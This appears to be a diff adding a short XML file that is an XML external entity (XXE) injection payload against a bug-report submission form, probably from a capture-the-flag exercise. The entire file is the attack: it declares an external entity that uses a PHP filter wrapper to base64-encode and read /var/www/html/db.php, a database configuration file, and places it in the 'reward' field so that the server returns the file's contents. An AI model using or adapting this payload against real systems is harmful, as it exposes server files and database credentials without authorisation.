@@ -1,0 +1,9 @@
+<?xml version="1.0" encoding="ISO-8859-1"?>
+<!DOCTYPE data [
+<!ENTITY file SYSTEM "php://filter/convert.base64-encode/resource=/var/www/html/db.php"> ]>
+<bugreport>
+<title>test</title>
+    <cwe>test</cwe>
+    <cvss>test</cvss>
+    <reward>&file;</reward>
+</bugreport>
